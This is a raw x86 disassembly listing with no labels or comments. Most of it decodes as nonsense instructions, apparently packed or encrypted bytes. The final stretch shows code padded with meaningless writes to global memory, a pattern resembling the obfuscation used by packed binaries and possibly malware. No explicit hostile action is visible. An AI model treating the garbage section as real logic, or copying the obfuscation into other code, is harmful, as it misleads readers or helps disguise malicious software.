  4058e2:	xor    DWORD PTR [esi-0x67],ebx
  4058e5:	adc    eax,0x38685bf
  4058ea:	push   edx
  4058eb:	pop    ebx
  4058ec:	lods   eax,DWORD PTR ds:[esi]
  4058ed:	pop    ds
  4058ee:	dec    esp
  4058ef:	enter  0xe5e0,0x21
  4058f3:	cmp    al,0x90
  4058f6:	xchg   ebp,eax
  4058f7:	add    eax,0xd86aa03f
  4058fc:	push   ebx
  4058fd:	inc    edi
  4058fe:	pop    ecx
  4058ff:	dec    edi
  405900:	popf   
  405901:	push   0x4b1cc422
  405906:	jg     0x405958
  405908:	stc    
  405909:	fild   DWORD PTR [esi+0x2142d018]
  40590f:	pop    ds
  405910:	pop    edx
  405911:	push   es
  405912:	enter  0x9d3,0x9d
  405916:	arpl   WORD PTR [esi-0xe],dx
  405919:	fst    st(3)
  40591b:	inc    edx
  40591c:	add    al,0x58
  40591e:	jo     0x405952
  405920:	sub    ch,dh
  405922:	hlt    
  405923:	push   ds
  405924:	sbb    esi,DWORD PTR [eax]
  405926:	fdivr  QWORD PTR [ebp-0x49bee773]
  40592c:	(bad)  
  40592d:	daa    
  40592e:	fst    QWORD PTR [ebx]
  405930:	popa   
  405931:	mov    ds:0xf8914988,al
  405936:	xchg   si,ax
  405938:	fst    QWORD PTR [ebx+0x33]
  40593b:	sub    BYTE PTR [ecx-0x73],dh
  40593e:	sub    al,0x25
  405940:	test   BYTE PTR [edx],cl
  405942:	add    cl,cl
  405944:	daa    
  405945:	dec    ecx
  405946:	push   0x3c
  405948:	fstp   QWORD PTR [edx+edx*8+0x1c]
  40594c:	push   es
  40594d:	sub    BYTE PTR [esi+0x3dc20d1f],0x42
  405954:	in     eax,dx
  405955:	xor    DWORD PTR [edx-0x2c],esi
  405958:	pop    ss
  405959:	ret    
  40595a:	jbe    0x405961
  40595c:	mov    eax,0x5693cc01
  405961:	stc    
  405962:	mov    edi,0x5c1408a2
  405967:	and    al,0x6
  405969:	(bad)  
  40596a:	mov    edx,0xf7fc7a92
  40596f:	test   eax,0x370d4160
  405974:	arpl   WORD PTR fs:[edi],sp
  405977:	es inc esi
  405979:	xchg   ecx,ebp
  40597b:	leave  
  40597c:	pushf  
  40597d:	mov    ebx,0x51154a21
  405982:	sub    BYTE PTR [edx],0xf7
  405985:	xor    BYTE PTR [edi],dl
  405987:	sub    cl,dl
  405989:	adc    al,0xc7
  40598b:	or     ebx,DWORD PTR [esi-0x556d9795]
  405991:	dec    esp
  405992:	aaa    
  405993:	xchg   DWORD PTR [ebp+0x7e],edi
  405996:	outs   dx,DWORD PTR ds:[esi]
  405997:	inc    ebx
  405998:	and    DWORD PTR [esp+ebp*1-0x41],ebp
  40599c:	sbb    DWORD PTR [eax+edi*1],0xffffffef
  4059a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059a1:	cld    
  4059a2:	and    ah,BYTE PTR [ecx-0x3a]
  4059a5:	push   ebp
  4059a6:	cmp    ah,dh
  4059a8:	rol    ah,1
  4059aa:	jle    0x405994
  4059ac:	repnz (bad) 
  4059ae:	cwde   
  4059af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059b0:	cdq    
  4059b1:	shr    ch,cl
  4059b3:	ins    DWORD PTR es:[edi],dx
  4059b4:	cmp    BYTE PTR [esi],bh
  4059b6:	inc    eax
  4059b7:	push   edx
  4059b8:	xor    BYTE PTR [eax+0x2ab082],ch
  4059be:	push   esi
  4059bf:	pop    ecx
  4059c0:	loopne 0x405a2d
  4059c2:	inc    ebx
  4059c3:	jo     0x4059a7
  4059c5:	cmp    ch,BYTE PTR [edx-0x13]
  4059c8:	adc    al,0x1e
  4059ca:	scas   al,BYTE PTR es:[edi]
  4059cb:	shr    DWORD PTR [edx-0x66],cl
  4059ce:	iret   
  4059cf:	pop    edi
  4059d0:	rcl    ch,1
  4059d2:	push   ebx
  4059d3:	jo     0x4059ee
  4059d5:	scas   al,BYTE PTR es:[edi]
  4059d6:	cwde   
  4059d7:	frstor [edx+ebx*4]
  4059da:	push   ebp
  4059db:	mov    bh,0x34
  4059dd:	push   ecx
  4059de:	mov    dl,0xb5
  4059e1:	shl    BYTE PTR [edi],0x26
  4059e4:	dec    esp
  4059e5:	les    ebp,FWORD PTR [ecx+0x16]
  4059e8:	ins    BYTE PTR es:[edi],dx
  4059e9:	sar    BYTE PTR [edx-0x7044a79a],0xf9
  4059f0:	sbb    ah,0x32
  4059f3:	sbb    edx,ecx
  4059f5:	fstp   DWORD PTR [eax]
  4059f7:	out    0xb3,eax
  4059f9:	das    
  4059fa:	sub    al,0x8e
  4059fc:	mov    bh,0xd2
  4059fe:	jb     0x4059fb
  405a00:	sbb    ebx,DWORD PTR [eax-0x425ecb88]
  405a06:	dec    eax
  405a07:	nop
  405a08:	adc    edx,ecx
  405a0a:	jge    0x4059e6
  405a0c:	xchg   BYTE PTR [esi-0x757eaba1],ah
  405a12:	pop    es
  405a13:	ss jb  0x405a51
  405a16:	push   cs
  405a17:	mov    esp,0x5d13ea
  405a1c:	xor    DWORD PTR [edx+0x51],edi
  405a1f:	adc    BYTE PTR [esi+0x19],cl
  405a22:	jb     0x4059f2
  405a24:	(bad)  
  405a25:	stos   BYTE PTR es:[edi],al
  405a26:	jmp    0x405a9d
  405a28:	xchg   ecx,eax
  405a29:	xchg   ecx,eax
  405a2a:	ins    DWORD PTR es:[edi],dx
  405a2b:	xor    eax,0x64022fb7
  405a30:	mov    ecx,0xbc627fc4
  405a35:	pop    edx
  405a36:	mov    edx,cs
  405a38:	jns    0x4059c5
  405a3a:	jae    0x405a10
  405a3c:	int    0xd3
  405a3e:	int    0xb1
  405a40:	xchg   ecx,eax
  405a41:	retf   0xd4ce
  405a44:	inc    DWORD PTR [edx]
  405a46:	dec    edi
  405a47:	mov    bh,0x27
  405a49:	push   edi
  405a4a:	adc    eax,0x6288364c
  405a4f:	jmp    0x64c31e27
  405a54:	je     0x405a2c
  405a56:	out    0x9a,eax
  405a58:	ds mov al,0xdf
  405a5b:	retf   0x7da7
  405a5e:	xchg   esi,eax
  405a5f:	mov    ch,0x93
  405a61:	push   esi
  405a62:	sti    
  405a63:	or     DWORD PTR [edi+0x25],esp
  405a66:	or     esp,edi
  405a68:	je     0x405adb
  405a6a:	xor    BYTE PTR [ecx],bl
  405a6c:	arpl   WORD PTR [edi-0x4678e9f1],bx
  405a72:	pop    edx
  405a73:	mov    dl,0x1a
  405a75:	rol    eax,0x6b
  405a78:	out    0x1e,al
  405a7a:	daa    
  405a7b:	or     eax,0xb4aa576d
  405a80:	mov    ah,0x3b
  405a82:	mov    esi,0x88976319
  405a87:	cmp    al,bh
  405a89:	ss fs adc bl,bl
  405a8d:	jg     0x405a6e
  405a8f:	pop    esi
  405a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a91:	cld    
  405a92:	sbb    al,al
  405a94:	pop    edi
  405a95:	dec    edi
  405a96:	sub    cl,cl
  405a98:	out    dx,al
  405a99:	push   ss
  405a9a:	mov    bl,0x37
  405a9c:	or     al,0xc
  405a9e:	jns    0x405a5b
  405aa0:	xor    DWORD PTR [edi-0x1e],esi
  405aa3:	test   al,0x88
  405aa5:	das    
  405aa6:	sbb    BYTE PTR [ebp-0x5c545984],dl
  405aac:	lea    ebp,[eax+0x4a]
  405aaf:	retf   
  405ab0:	popf   
  405ab1:	mov    eax,0x1480cc92
  405ab6:	test   al,0x97
  405ab8:	ror    BYTE PTR [edi+0x77],cl
  405abb:	sahf   
  405abc:	dec    DWORD PTR [ecx]
  405abe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405abf:	adc    al,0xe8
  405ac1:	(bad)  
  405ac2:	jnp    0x405b1e
  405ac4:	shl    DWORD PTR [ecx],0x62
  405ac7:	mov    eax,ds:0x458b02e5
  405acc:	xor    esi,edx
  405ace:	mov    cl,0xee
  405ad0:	pop    edx
  405ad1:	outs   dx,DWORD PTR ds:[esi]
  405ad2:	or     eax,0x22fe920d
  405ad7:	in     eax,dx
  405ad8:	jne    0x405a9d
  405ada:	mov    edi,0x2592ccbd
  405adf:	mov    edi,DWORD PTR [eax-0x9a142f5]
  405ae5:	ds mov ebx,ss
  405ae8:	fwait
  405ae9:	shl    DWORD PTR ds:0x82be5cf3,0x1e
  405af0:	out    dx,eax
  405af1:	mov    ebx,0x92ae2a61
  405af6:	ss push ds
  405af8:	xor    BYTE PTR [edi],cl
  405afa:	outs   dx,DWORD PTR ds:[esi]
  405afb:	cs mov bl,0x40
  405afe:	sti    
  405aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b00:	dec    edx
  405b01:	jge    0x405a86
  405b03:	addr16 add eax,0xc3ea1ac0
  405b09:	into   
  405b0a:	mov    esi,0xdcb0904e
  405b0f:	fstp   TBYTE PTR [esi+eax*4]
  405b12:	or     cl,al
  405b14:	fbstp  TBYTE PTR ds:0xfe89cee9
  405b1a:	repz rcr BYTE PTR es:[eax+0x35778f70],0x15
  405b23:	mov    WORD PTR [ecx],fs
  405b25:	mov    ds:0xb94f10c2,eax
  405b2a:	das    
  405b2b:	sar    DWORD PTR [esp+esi*1],cl
  405b2e:	pop    ebp
  405b2f:	cmp    edi,DWORD PTR ds:0xd1bb8d68
  405b35:	rcl    ecx,1
  405b37:	fidiv  WORD PTR [eax-0x6d5f8650]
  405b3d:	cdq    
  405b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b3f:	dec    ebp
  405b40:	fisttp QWORD PTR [ecx+0x3d3b420c]
  405b46:	pop    ds
  405b47:	js     0x405b86
  405b49:	bound  ebx,QWORD PTR [ebp-0x10376f7f]
  405b4f:	jmp    0xf658:0x1742cefb
  405b56:	push   esi
  405b57:	mov    dl,bl
  405b59:	mov    cl,0x30
  405b5b:	in     al,dx
  405b5c:	xchg   ecx,eax
  405b5d:	cs jle 0x405b9b
  405b60:	sahf   
  405b61:	test   BYTE PTR [ebx-0x67],cl
  405b64:	inc    ecx
  405b65:	sbb    eax,DWORD PTR [eax]
  405b67:	shl    DWORD PTR [edx+ecx*4-0x49],1
  405b6b:	adc    DWORD PTR [ecx-0x3c],ecx
  405b6e:	add    eax,0x52e4619
  405b73:	(bad)
  405b77:	sub    eax,0x88d44042
  405b7c:	or     eax,0xa6f6fcaf
  405b81:	ret    
  405b82:	imul   ecx,DWORD PTR [esi],0xffffffed
  405b85:	out    0xf0,al
  405b87:	pop    ds
  405b88:	ret    0x1957
  405b8b:	mov    ah,0x89
  405b8d:	nop
  405b8e:	popf   
  405b8f:	shl    DWORD PTR [ebx+eax*8-0x2c],0x20
  405b94:	sbb    esi,ebp
  405b96:	jle    0x405bfe
  405b98:	mov    dl,0xbd
  405b9a:	std    
  405b9b:	ret    
  405b9c:	xchg   esp,eax
  405b9d:	cmp    edi,DWORD PTR [ecx+edx*1]
  405ba0:	mov    bh,0x32
  405ba2:	add    DWORD PTR [edx-0x498800e2],ebx
  405ba8:	repz icebp 
  405baa:	test   bl,cl
  405bac:	pusha  
  405bad:	or     al,0x37
  405baf:	add    al,BYTE PTR [esi+eax*2+0x60fc2459]
  405bb6:	xor    BYTE PTR ds:0x952fba92,cl
  405bbc:	jb     0x405c06
  405bbe:	sbb    eax,0xed9e84ec
  405bc3:	pusha  
  405bc4:	jp     0x405bbe
  405bc6:	xor    DWORD PTR [eax],0xffffffaa
  405bc9:	sbb    eax,0xb16f1a3e
  405bce:	into   
  405bcf:	dec    esp
  405bd0:	sbb    eax,0xcc15c2cd
  405bd5:	loopne 0x405bf0
  405bd7:	or     DWORD PTR [ebp-0x77e1a121],ebp
  405bdd:	pop    esi
  405bde:	call   0xb969dc20
  405be3:	mov    bh,0xa6
  405be5:	retf   0x5f74
  405be8:	xchg   ebp,eax
  405be9:	(bad)  [ecx+0x1c047248]
  405bef:	test   edi,ebx
  405bf1:	xchg   ecx,eax
  405bf2:	(bad)  
  405bf3:	loopne 0x405bb1
  405bf5:	ins    DWORD PTR es:[edi],dx
  405bf6:	add    ch,BYTE PTR [eax-0x4e]
  405bf9:	jb     0x405bbb
  405bfb:	loop   0x405bd3
  405bfd:	mov    esp,0x8be5e061
  405c02:	imul   eax,esp,0xf6696bd1
  405c08:	mov    esp,0x67f19230
  405c0d:	(bad)  
  405c0f:	outs   dx,DWORD PTR ds:[esi]
  405c10:	push   es
  405c11:	inc    esi
  405c12:	push   edx
  405c13:	mov    ebp,0x722a8a02
  405c18:	cs mov eax,0xff975581
  405c1e:	jno    0x405c81
  405c20:	jno    0x405c76
  405c22:	jmp    0x447d:0xfb0d005
  405c29:	inc    ebp
  405c2a:	pusha  
  405c2b:	xor    ch,dl
  405c2d:	(bad)  
  405c2e:	fild   WORD PTR [ebx+eax*1-0x11]
  405c32:	dec    eax
  405c33:	inc    ebp
  405c34:	cs repnz into 
  405c37:	jmp    0x405cac
  405c39:	inc    ebx
  405c3a:	ds es push esp
  405c3d:	and    eax,0x87aa747b
  405c42:	pop    DWORD PTR es:[esi+0x53]
  405c46:	in     eax,dx
  405c47:	inc    esi
  405c48:	shr    BYTE PTR [ebx-0x57],cl
  405c4b:	cmp    al,0xa9
  405c4d:	daa    
  405c4e:	imul   ebp,DWORD PTR [ebx+0x1eb3cab6],0x61
  405c55:	enter  0xc066,0x9f
  405c59:	int    0xd4
  405c5b:	and    eax,0xa08875df
  405c60:	fwait
  405c61:	rep lods al,BYTE PTR ds:[esi]
  405c63:	stos   BYTE PTR es:[edi],al
  405c64:	cli    
  405c65:	adc    bl,BYTE PTR [edi-0x5bcb2934]
  405c6b:	fist   DWORD PTR [ebx]
  405c6d:	mov    ebp,0x5e810967
  405c72:	add    BYTE PTR [esi+0x5b],0x42
  405c76:	mov    al,ds:0xec1bad12
  405c7b:	inc    ecx
  405c7c:	(bad)  
  405c7d:	setl   BYTE PTR [edx-0x7a14b886]
  405c84:	sub    al,0xaa
  405c86:	clc    
  405c87:	jmp    0x6bf5334b
  405c8c:	jmp    0xfdf3:0x1fba8d3
  405c93:	dec    edx
  405c94:	sbb    eax,0x39a6a43b
  405c99:	push   ecx
  405c9a:	mov    ebx,0x30950892
  405c9f:	add    eax,0x74a27730
  405ca4:	mov    edx,ebx
  405ca6:	sahf   
  405ca7:	jns    0x405c2a
  405ca9:	xchg   ebx,eax
  405caa:	and    DWORD PTR [edx-0x6ccf9bec],esp
  405cb0:	rcr    DWORD PTR [esi-0x2474f6a1],cl
  405cb6:	loopne 0x405d26
  405cb8:	ds jmp 0x91:0x4f3bb34d
  405cc0:	mov    WORD PTR [edx-0x67],?
  405cc3:	push   es
  405cc4:	stc    
  405cc5:	sub    DWORD PTR cs:[eax],esi
  405cc8:	sub    edi,DWORD PTR [esi+edx*2-0x5ef10c33]
  405ccf:	cmp    BYTE PTR [ecx],ah
  405cd1:	jno    0x405c95
  405cd3:	ss jl  0x405cdf
  405cd6:	ret    
  405cd7:	(bad)  
  405cd9:	jo     0x405c68
  405cdb:	cmp    eax,0x445ba2cf
  405ce0:	mul    BYTE PTR [eax-0x5e]
  405ce3:	mov    ch,0x6e
  405ce5:	call   0x9a247a6c
  405cea:	and    al,0x3a
  405cec:	cmp    ch,cl
  405cee:	push   esi
  405cef:	xor    BYTE PTR [ecx-0x41e33f4e],0xb0
  405cf6:	fidiv  DWORD PTR [edx+0x23]
  405cf9:	dec    esp
  405cfa:	test   DWORD PTR [eax],edi
  405cfc:	repz (bad) 
  405cfe:	repz shl BYTE PTR [esi],1
  405d01:	xlat   BYTE PTR ds:[ebx]
  405d02:	daa    
  405d03:	iret   
  405d04:	les    edi,FWORD PTR [ebx+0x60]
  405d07:	ja     0x405cd1
  405d09:	inc    esp
  405d0a:	xchg   esp,eax
  405d0b:	enter  0xcfb8,0x8a
  405d0f:	mov    ah,0xba
  405d11:	push   es
  405d12:	and    DWORD PTR [edi+edx*8-0x61ee645b],edi
  405d19:	push   ss
  405d1a:	mov    edi,0x4e532874
  405d1f:	mov    ds:0xef5de5bf,eax
  405d24:	push   ebp
  405d25:	(bad)  
  405d26:	out    dx,al
  405d27:	jb     0x405cc5
  405d29:	jg     0x405d29
  405d2b:	push   edi
  405d2c:	shl    DWORD PTR [edx+0x33],cl
  405d2f:	scas   al,BYTE PTR es:[edi]
  405d30:	push   ss
  405d31:	adc    BYTE PTR [ecx],al
  405d33:	mov    dl,0x1b
  405d35:	add    eax,0x783f802
  405d3a:	clc    
  405d3b:	stos   BYTE PTR es:[edi],al
  405d3c:	sbb    dl,bh
  405d3e:	daa    
  405d3f:	pushf  
  405d40:	leave  
  405d41:	sub    eax,0x7e27491f
  405d46:	pop    eax
  405d47:	cld    
  405d48:	push   0xb28a6570
  405d4d:	inc    ecx
  405d4e:	dec    ecx
  405d4f:	(bad)  
  405d50:	mov    eax,0x33ba5754
  405d55:	cmp    eax,0x762e9998
  405d5a:	push   0xf298be8b
  405d5f:	das    
  405d60:	popf   
  405d61:	cmovl  esi,DWORD PTR [esi]
  405d64:	rol    BYTE PTR [edx-0x592e7dab],0xd3
  405d6b:	mov    ch,0x46
  405d6d:	and    al,0x9c
  405d6f:	jb     0x405d28
  405d71:	aam    0x11
  405d73:	fistp  QWORD PTR [eax+0x3c]
  405d76:	and    BYTE PTR [edi+0x55],al
  405d79:	sub    al,0xa3
  405d7b:	sbb    ah,BYTE PTR [ecx-0x4b714321]
  405d81:	adc    dl,BYTE PTR [ecx]
  405d83:	js     0x405da8
  405d85:	and    dh,dh
  405d87:	dec    ecx
  405d88:	das    
  405d89:	call   DWORD PTR [edi]
  405d8b:	test   eax,0x13ac2984
  405d90:	mov    esp,0x3fe5935e
  405d95:	push   ds
  405d96:	push   cs
  405d97:	mov    eax,0x1f4e0655
  405d9c:	cs sbb al,0x33
  405d9f:	adc    BYTE PTR [edi+eiz*4+0x960cd89],0x97
  405da7:	fmul   st(7),st
  405da9:	enter  0xe4cf,0x10
  405dad:	loop   0x405d9e
  405daf:	fwait
  405db0:	lods   eax,DWORD PTR ds:[esi]
  405db1:	adc    DWORD PTR [edx+0x19d3219a],edx
  405db7:	jmp    0xbd4a6604
  405dbc:	imul   edi,esi,0xf1b93006
  405dc2:	nop
  405dc3:	mov    ebx,0xa035ef63
  405dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dc9:	jne    0x405d5e
  405dcb:	sbb    eax,0xd8c23ce5
  405dd0:	sub    eax,0x9156e59
  405dd5:	xor    esi,esi
  405dd7:	neg    DWORD PTR [esi+0x5e]
  405dda:	(bad)  
  405ddb:	rcpps  xmm3,XMMWORD PTR [ebp-0x6a]
  405ddf:	sub    eax,0x4fafdfdf
  405de4:	add    eax,0x817e633f
  405de9:	sub    BYTE PTR [edi+0xc],dl
  405dec:	xor    al,0x78
  405dee:	mov    ebx,DWORD PTR [edi+0x99e07a]
  405df4:	call   0x68c7af3b
  405df9:	inc    ecx
  405dfa:	nop
  405dfb:	or     ebx,DWORD PTR [eax+0x4001cdcf]
  405e01:	mov    esp,0x8c670de
  405e06:	push   ds
  405e07:	hlt    
  405e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e09:	xor    bh,BYTE PTR [edx+eiz*1-0x69]
  405e0d:	push   esi
  405e0e:	ret    0x7248
  405e11:	(bad)  
  405e13:	std    
  405e14:	int    0xf0
  405e16:	jmp    0x59f2:0x9ed8b25
  405e1d:	data16 lock sbb al,0x93
  405e21:	scas   al,BYTE PTR es:[edi]
  405e22:	jno    0x405e0b
  405e24:	(bad)  
  405e25:	mov    eax,0xb6350319
  405e2a:	mov    eax,ds:0x2d8cde01
  405e2f:	inc    edx
  405e30:	aaa    
  405e31:	out    dx,eax
  405e32:	(bad)
  405e35:	sub    DWORD PTR ds:0xd3588b2d,ebx
  405e3b:	mov    ds:0x5054e3dd,al
  405e40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e41:	(bad)  
  405e42:	mov    ebp,0xb4e5eb7e
  405e47:	sub    DWORD PTR [ebx+eiz*4],esi
  405e4a:	fadd   st(4),st
  405e4c:	push   ecx
  405e4d:	mov    esi,0x2558ae26
  405e52:	xor    BYTE PTR [edx+0x79],bh
  405e55:	cmp    edi,DWORD PTR [edi]
  405e57:	xchg   esi,eax
  405e58:	mov    ds:0x62a6654f,eax
  405e5d:	xlat   BYTE PTR ds:[ebx]
  405e5e:	mov    ebx,0x6717f9b0
  405e63:	mov    cl,0xe9
  405e65:	adc    esi,DWORD PTR [esi]
  405e67:	pusha  
  405e68:	or     DWORD PTR [ebx+0x7c],0x51
  405e6c:	fldpi  
  405e6e:	pop    esi
  405e6f:	ds sbb al,0x2a
  405e72:	pop    edi
  405e73:	push   es
  405e74:	out    0x75,eax
  405e76:	fnstsw WORD PTR [eax-0x48a33b5a]
  405e7c:	loope  0x405e8e
  405e7e:	mov    es,WORD PTR [ecx+ecx*2-0x2b7477e2]
  405e85:	jge    0x405ed6
  405e87:	add    eax,0x86f7a035
  405e8c:	xchg   DWORD PTR [edi-0x666fb5be],ecx
  405e92:	inc    edi
  405e93:	add    edx,esp
  405e95:	or     eax,0x9cc12584
  405e9a:	or     dl,BYTE PTR [edi+edx*1]
  405e9d:	daa    
  405e9e:	bound  esp,QWORD PTR [ecx-0x69ed9177]
  405ea4:	repnz and BYTE PTR [esi+0x5e7a4bb7],bl
  405eab:	lods   eax,DWORD PTR ds:[esi]
  405eac:	lods   al,BYTE PTR ds:[esi]
  405ead:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  405eaf:	(bad)  
  405eb0:	mov    al,0xb5
  405eb2:	jecxz  0x405e50
  405eb4:	rol    cl,1
  405eb6:	mov    eax,ds:0xa1a2bb9
  405ebb:	sbb    ebx,ebp
  405ebd:	stos   BYTE PTR es:[edi],al
  405ebe:	jae    0x405e69
  405ec0:	jb     0x405e5b
  405ec2:	mov    BYTE PTR [edi+0xa],dh
  405ec5:	test   eax,0x76b3e3cf
  405eca:	in     eax,0x86
  405ecc:	out    dx,eax
  405ecd:	call   0xa582:0xf5a45114
  405ed4:	xchg   ecx,eax
  405ed5:	and    DWORD PTR [esp+eiz*4-0xaa80641],edx
  405edc:	mov    ch,0x6b
  405ede:	cdq    
  405edf:	popa   
  405ee0:	cmp    esp,DWORD PTR [esi-0x1f]
  405ee3:	jp     0x405ebc
  405ee5:	mov    dl,0xb0
  405ee7:	sub    BYTE PTR [edi+edi*2+0x166fa328],bl
  405eee:	mov    esi,?
  405ef0:	fistp  QWORD PTR [esi]
  405ef2:	mov    ah,0xa5
  405ef4:	ret    0x2c73
  405ef7:	mov    ebx,0x4defdbc9
  405efc:	retf   0xc450
  405eff:	cmp    eax,0x875c3d72
  405f04:	push   eax
  405f05:	jbe    0x405eca
  405f07:	sahf   
  405f08:	(bad)  
  405f09:	mov    dh,0x4d
  405f0b:	jmp    0x6a7b:0x435f2170
  405f12:	ds xchg esp,eax
  405f14:	mov    esp,DWORD PTR [esi]
  405f16:	clc    
  405f17:	cdq    
  405f18:	loope  0x405f2d
  405f1a:	aaa    
  405f1b:	scas   eax,DWORD PTR es:[edi]
  405f1c:	cmp    BYTE PTR [edx+0x570f8eac],al
  405f22:	sbb    ebx,edi
  405f24:	lods   al,BYTE PTR ds:[esi]
  405f25:	xchg   edi,eax
  405f26:	mov    eax,0x1231b8c5
  405f2b:	data16 (bad) 
  405f2d:	ds enter 0xadc9,0x68
  405f32:	leave  
  405f33:	aas    
  405f34:	and    ecx,DWORD PTR [edx*8+0x1014257f]
  405f3b:	jl     0x405f82
  405f3d:	mov    edx,0xa4ba11f3
  405f42:	mov    bl,0xcf
  405f44:	pop    es
  405f45:	and    al,0x13
  405f47:	fs jno 0x405f17
  405f4a:	add    al,bl
  405f4c:	push   esi
  405f4d:	mov    ch,0x2
  405f4f:	sbb    BYTE PTR [edi+esi*1-0x7c],dl
  405f53:	sar    BYTE PTR [ebx-0x3f],1
  405f56:	hlt    
  405f57:	cli    
  405f58:	cmp    al,0x8
  405f5a:	test   al,0x61
  405f5c:	rol    DWORD PTR [edx+ecx*2+0x68],0x6c
  405f61:	mov    al,ds:0x35f808cd
  405f66:	shl    DWORD PTR ds:0x81fd98ee,0x97
  405f6d:	test   eax,ebp
  405f6f:	fld    TBYTE PTR [edi]
  405f71:	push   ecx
  405f72:	out    0xf8,al
  405f74:	out    dx,eax
  405f75:	pop    ss
  405f76:	cmp    bh,BYTE PTR [ebx-0xbbd8258]
  405f7c:	cmp    al,0xbb
  405f7e:	fs mov dh,0x9b
  405f81:	jns    0x405f2f
  405f83:	inc    ebp
  405f84:	add    esp,esp
  405f86:	ins    DWORD PTR es:[edi],dx
  405f87:	mov    bh,0x8c
  405f89:	das    
  405f8a:	sahf   
  405f8b:	jno    0x406007
  405f8d:	or     BYTE PTR [eax],dl
  405f8f:	addr16 stc 
  405f91:	cmp    eax,0x70306d07
  405f96:	cmp    ebx,DWORD PTR [edx-0x7e73004e]
  405f9c:	dec    ecx
  405f9d:	push   ebp
  405f9e:	(bad)  
  405f9f:	jmp    0x40600c
  405fa1:	mov    eax,ds:0x778fc3bd
  405fa6:	push   eax
  405fa7:	add    esp,DWORD PTR [eax-0x1]
  405faa:	ins    DWORD PTR es:[edi],dx
  405fab:	rol    DWORD PTR [edi-0x72],1
  405fae:	push   edx
  405faf:	fs aas 
  405fb1:	enter  0x4a83,0x12
  405fb5:	mov    eax,cs:0xe8ff9dcf
  405fbb:	pop    edx
  405fbc:	and    eax,DWORD PTR [edi-0x2f88ad79]
  405fc2:	push   0xffffffa5
  405fc4:	ret    0xf46c
  405fc7:	stos   DWORD PTR es:[edi],eax
  405fc8:	cdq    
  405fc9:	push   0x78
  405fcb:	in     al,dx
  405fcc:	push   edi
  405fcd:	rcr    DWORD PTR [edi+0x67],0x7a
  405fd1:	loope  0x405ffe
  405fd3:	or     bl,BYTE PTR [eax+0x74f54f18]
  405fd9:	out    0xa,eax
  405fdb:	popa   
  405fdc:	jle    0x40605a
  405fde:	push   edi
  405fdf:	push   0x8d7e82f4
  405fe4:	into   
  405fe5:	pavgb  mm3,QWORD PTR [ebp-0x51]
  405fe9:	mov    edi,0xdc5148af
  405fee:	push   edx
  405fef:	xor    eax,0x78242f48
  405ff4:	xchg   ebp,eax
  405ff5:	js     0x405fbe
  405ff7:	popa   
  405ff8:	add    ecx,DWORD PTR [eax+0x1c]
  405ffb:	mov    DWORD PTR ds:0x42e000,ecx
  406001:	mov    eax,edi
  406003:	mov    DWORD PTR ds:0x432008,0x604
  40600d:	mov    DWORD PTR [ebp-0x18],ecx
  406010:	jmp    0x406130
  406015:	mov    ecx,DWORD PTR [ebp-0x2c]
  406018:	sbb    edx,0x16d9
  40601e:	mov    edx,DWORD PTR [ebp+0x8]
  406021:	add    edx,DWORD PTR [ecx+esi*4]
  406024:	and    DWORD PTR ds:0x42f018,edx
  40602a:	mov    DWORD PTR [ebp-0x28],edx
  40602d:	mov    ecx,DWORD PTR [ebp-0x4]
  406030:	sub    DWORD PTR ds:0x431018,0x64e4
  40603a:	mov    edx,DWORD PTR [ebp-0x28]
  40603d:	or     DWORD PTR ds:0x42e018,0x42f000
  406047:	xor    ecx,ebx
  406049:	add    ecx,eax
  40604b:	cmp    edx,ecx
  40604d:	mov    DWORD PTR ds:0x432000,0x313
  406057:	je     0x406130
  40605d:	mov    DWORD PTR ds:0x42e018,0x7300
  406067:	jmp    0x4060e8
  40606c:	mov    ecx,DWORD PTR [ebp-0x4]
  40606f:	mov    edx,DWORD PTR [ebp-0x8]
  406072:	and    DWORD PTR ds:0x42e00c,0x1202
  40607c:	xor    ecx,ebx
  40607e:	add    ecx,eax
  406080:	mov    DWORD PTR ds:0x431008,0x7c7b
  40608a:	cmp    edx,ecx
  40608c:	mov    DWORD PTR ds:0x42f01c,0x7fb2
  406096:	je     0x4061f8
  40609c:	mov    ecx,DWORD PTR [ebp-0x4]
  40609f:	mov    edx,DWORD PTR ds:0x42e00c
  4060a5:	add    edx,DWORD PTR ds:0x42e024
  4060ab:	mov    DWORD PTR ds:0x42e00c,edx
  4060b1:	mov    edx,DWORD PTR [ebp-0x30]
  4060b4:	xor    DWORD PTR ds:0x43001c,0x1b7f
  4060be:	xor    ecx,ebx
  4060c0:	and    DWORD PTR ds:0x42f000,0x18f7
  4060ca:	add    ecx,eax
  4060cc:	mov    DWORD PTR ds:0x432000,0x7c66
  4060d6:	cmp    edx,ecx
  4060d8:	mov    DWORD PTR ds:0x430010,0x7fa8
  4060e2:	je     0x406207
  4060e8:	sbb    DWORD PTR ds:0x42f010,0x385b
  4060f2:	lea    eax,[ebp-0x8]
  4060f5:	or     DWORD PTR ds:0x42f004,0x432018
  4060ff:	push   eax
  406100:	dec    DWORD PTR ds:0x42e01c
  406106:	push   DWORD PTR [ebp-0x28]
  406109:	sub    DWORD PTR ds:0x432000,0x29af
  406113:	push   DWORD PTR [ebp+0xc]
  406116:	add    DWORD PTR ds:0x42f018,0x430008
  406120:	call   0x415780
  406125:	not    DWORD PTR ds:0x42e00c
  40612b:	mov    eax,0x3272d9
  406130:	mov    edx,DWORD PTR ds:0x430004
  406136:	add    edx,DWORD PTR ds:0x430008
  40613c:	mov    DWORD PTR ds:0x430004,edx
  406142:	mov    ecx,DWORD PTR [ebp-0x4]
  406145:	adc    edx,0x7040
  40614b:	mov    edx,DWORD PTR [ebp-0x8]
  40614e:	add    DWORD PTR ds:0x430010,0x607c
  406158:	xor    ecx,ebx
  40615a:	add    ecx,eax
  40615c:	mov    DWORD PTR ds:0x42e008,0x21b2
  406166:	cmp    edx,ecx
  406168:	mov    DWORD PTR ds:0x431000,0x5d74
  406172:	je     0x4061b1
  406178:	mov    ecx,DWORD PTR [ebp-0x34]
